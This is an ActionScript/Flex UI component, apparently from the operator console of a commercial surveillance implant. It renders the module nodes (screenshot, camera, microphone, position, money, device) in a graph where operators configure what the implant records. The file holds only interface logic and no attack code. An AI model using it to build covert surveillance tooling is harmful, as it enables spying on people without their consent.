package it.ht.rcs.console.operations.view.configuration.advanced.renderers
{
  import flash.events.MouseEvent;
  import flash.geom.Point;
  import flash.ui.Mouse;
  import flash.ui.MouseCursor;
  import flash.utils.getDefinitionByName;
  
  import it.ht.rcs.console.operations.view.configuration.advanced.ConfigurationGraph;
  import it.ht.rcs.console.operations.view.configuration.advanced.forms.modules.AllModuleForms;
  import it.ht.rcs.console.operations.view.configuration.advanced.forms.modules.ModuleForm;
  
  import mx.managers.PopUpManager;
  
  import spark.components.BorderContainer;
  import spark.components.Group;
  import spark.primitives.BitmapImage;
  
  public class ModuleRenderer extends Group implements Linkable
  {
    
    [Embed (source="img/modules/Create.png" )]
    public var okIcon:Class;
    
    [Embed (source="img/modules/No-entry.png" )]
    public var noIcon:Class;
    
    private static const WIDTH:Number  = 45;
    private static const HEIGHT:Number = 45;
    
    private static const NORMAL_COLOR:uint   = 0xffffff;
    private static const SELECTED_COLOR:uint = 0xdddddd;
    private static const ACCEPT_COLOR:uint   = 0x99bb99;
    private static const REJECT_COLOR:uint   = 0xbb9999;
    
    private var container:BorderContainer;
    private var icon:BitmapImage;
    
    private var acceptDragIcon:BitmapImage;
    
    private var inBound:Vector.<Connection> = new Vector.<Connection>();
    public function inBoundConnections():Vector.<Connection>  { return inBound; }
    public function outBoundConnections():Vector.<Connection> { return null; }
    
    private var graph:ConfigurationGraph;
    
    public var module:Object;
    
    private static const packagePrefix:String = 'it.ht.rcs.console.operations.view.configuration.advanced.forms.modules.';
    private static const forms:AllModuleForms = null; // This reference is just to force the import of the form classes
    
    public function ModuleRenderer(module:Object, graph:ConfigurationGraph)
    {
      super();
      layout = null;
      doubleClickEnabled = true;
      width = WIDTH;
      height = HEIGHT;
      
      this.module = module;
      this.graph = graph;
      
      addEventListener(MouseEvent.MOUSE_DOWN, onMouseDown);
      addEventListener(MouseEvent.MOUSE_OVER, onMouseOver);
      addEventListener(MouseEvent.MOUSE_OUT, onMouseOut);
      addEventListener(MouseEvent.MOUSE_UP, onMouseUp);
      addEventListener(MouseEvent.CLICK, onClick);
      addEventListener(MouseEvent.DOUBLE_CLICK, onDoubleClick);
    }
    
    private function onMouseDown(me:MouseEvent):void
    {
      me.stopPropagation();
    }
    
    private function onMouseOver(me:MouseEvent):void
    {
      me.stopPropagation();
      Mouse.cursor = MouseCursor.AUTO;
      
      if (graph.mode == ConfigurationGraph.CONNECTING) {
        var pin:Pin = graph.currentConnection.from as Pin;
        var origin:Object = pin.parent;
        if (origin is ActionRenderer && ( pin.type == 'start' || pin.type == 'stop' )) { // Accept only inbound connections from actions
          
          if (pin.type == 'stop' && (module.module=="screenshot" || module.module=="camera" || module.module=="position" || module.module=="money")) { // Deny stop actions on some modules
            graph.currentTarget = null;
            container.setStyle('backgroundColor', REJECT_COLOR);
            acceptDragIcon.source=noIcon;
          }else
          {
            graph.currentTarget = this;
            container.setStyle('backgroundColor', ACCEPT_COLOR);
            acceptDragIcon.source=okIcon;
          }
        }
          
        else {
          graph.currentTarget = null;
          container.setStyle('backgroundColor', REJECT_COLOR);
          acceptDragIcon.source=noIcon;
        }
        acceptDragIcon.visible=true;
      }
    }
    
    private function onMouseOut(me:MouseEvent):void
    {
      if (graph.mode == ConfigurationGraph.CONNECTING) {
        graph.currentTarget = null;
        container.setStyle('backgroundColor', NORMAL_COLOR);
      }
      acceptDragIcon.visible=false;
    }
    
    private function onMouseUp(me:MouseEvent):void
    {
      if (graph.mode == ConfigurationGraph.CONNECTING)
        container.setStyle('backgroundColor', NORMAL_COLOR);
    }
    
    private function onClick(me:MouseEvent):void
    {
      me.stopPropagation();
      graph.removeSelection();
      
      selected = true;
      graph.selectedElement = this;
      
      setFocus();
      graph.highlightElement(this);
    }
    
    public function onDoubleClick(me:MouseEvent):void
    {
      
      if (graph.config.globals.type.toLowerCase() == 'mobile' && module.module == 'mic') return; // Do not edit mic in mobile
      
      if (graph.config.globals.type.toLowerCase() == 'desktop' && 
        (module.module == 'position' || module.module == 'device')) return; // Do not edit position and device in desktop
      
      try {
        var Form:Class = getDefinitionByName(packagePrefix + module.module) as Class;
        var popup:ModuleForm = PopUpManager.createPopUp(root, Form, true) as ModuleForm;
        popup.module = module;
        popup.graph = graph;
        PopUpManager.centerPopUp(popup);
      } catch (e:Error) {}
    }
    
    private var _selected:Boolean = false;
    public function get selected():Boolean { return _selected; }
    public function set selected(s:Boolean):void
    {
      _selected = s;
      container.setStyle('backgroundColor', _selected ? SELECTED_COLOR : NORMAL_COLOR);
    }
    
    override protected function createChildren():void
    {
      super.createChildren();
      
      if (container == null)
      {
        
        container = new BorderContainer();
        container.width = width;
        container.height = height;
        container.toolTip = module.module;
        container.setStyle('backgroundColor', NORMAL_COLOR);
        container.setStyle('borderColor', 0xdddddd);
        container.setStyle('cornerRadius', 10);
        
        icon = new BitmapImage();
        icon.horizontalCenter = icon.verticalCenter = 0;
        icon.source = ModuleIcons[module.module];
        container.addElement(icon);
        
        acceptDragIcon=new BitmapImage();
        acceptDragIcon.source=okIcon;
        acceptDragIcon.x=32;
        acceptDragIcon.y=-6;
        acceptDragIcon.visible=false;
        
        addElement(container);
        //addElement(acceptDragIcon);
      }
      
    }

    public function getLinkPoint():Point
    {
      return new Point(x + width/2, y - 5);
    }
    
  }
  
}